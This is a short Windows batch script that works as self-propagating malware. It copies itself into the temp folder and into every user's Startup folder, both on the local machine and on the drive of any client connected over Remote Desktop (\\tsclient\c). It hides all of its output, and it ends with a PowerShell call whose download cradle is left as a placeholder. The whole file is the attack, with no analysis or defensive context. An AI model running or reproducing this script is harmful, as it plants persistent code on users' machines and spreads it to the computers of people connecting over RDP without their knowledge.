@echo off

timeout 1 >nul 2>&1

mkdir \\tsclient\c\temp >nul 2>&1
mkdir C:\temp >nul 2>&1

copy run.bat C:\temp >nul 2>&1
copy run.bat \\tsclient\c\temp >nul 2>&1

del /q %TEMP%\temp_00.txt >nul 2>&1

set dirs=dir /a:d /b /s C:\users\*Startup*
set dirs2=dir /a:d /b /s \\tsclient\c\users\*startup*

echo|%dirs%|findstr /i "Microsoft\Windows\Start Menu\Programs\Startup">>"%TEMP%\temp_00.txt"
echo|%dirs2%|findstr /i "Microsoft\Windows\Start Menu\Programs\Startup">>"%TEMP%\temp_00.txt"

for /F "tokens=*" %%a in (%TEMP%\temp_00.txt) DO (
	copy run.bat "%%a" >nul 2>&1
	copy C:\temp\run.bat "%%a" >nul 2>&1
	copy \\tsclient\c\temp\run.bat "%%a" >nul 2>&1
)

del /q %TEMP%\temp_00.txt >nul 2>&1

powershell.exe <cradle here>